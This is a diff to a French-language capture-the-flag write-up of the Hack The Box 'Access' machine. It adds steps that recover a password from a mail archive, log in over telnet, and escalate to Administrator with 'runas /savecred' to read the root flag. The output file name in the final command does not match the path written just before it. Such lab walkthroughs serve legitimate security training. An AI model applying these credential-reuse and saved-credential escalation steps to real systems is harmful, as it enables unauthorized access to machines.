@@ -158,4 +158,37 @@ Pour lire le fichier donc il faut tapé la commande ci-dessous :
             "Access Control" - 2 items done, 0 items skipped.
     root@Computer:~/htb/writeup/Access#
 
-Parfait donc le programme à réussis a lire le fichier PST, visiblement c'est un fichier HTML, donc essayer de voir cela.
+Parfait donc le programme à réussi a lire le fichier PST, visiblement c'est un fichier HTML, donc essayer de mettre dans /var/www/html de lancer le serveur apache2 et de voir directement la sortie.
+
+Donc nous voyons un identifiant :
+
+    The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
+    
+Donc lançons telnet et on se connecte au serveur. Avec la commande taper ci-dessous.
+
+    root@Computer:~/htb/writeup/Access# telnet 10.10.10.98
+    Trying 10.10.10.98...
+    Connected to 10.10.10.98.
+    Escape character is '^]'.
+    Welcome to Microsoft Telnet Service 
+
+    login: security
+    password: 
+
+    *===============================================================
+    Microsoft Telnet Server.
+    *===============================================================
+    C:\Users\security> cd Desktop
+    C:\Users\security\Desktop> more user.txt
+    [...SNIP...]b48913b213a31ff6756d2553d38
+    
+PrivEsc
+----
+Le privesc rien de compliqué suffit d'utilisé la commande runnas.
+
+    C:\Users\security\Documents>runas /user:ACCESS\Administrator /savecred "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\temp\flag"
+
+    C:\Users\security\Documents>more C:\temp\caca
+    [...SNIP...]230a8d297e8f933d904cf
+
+    C:\Users\security\Documents>
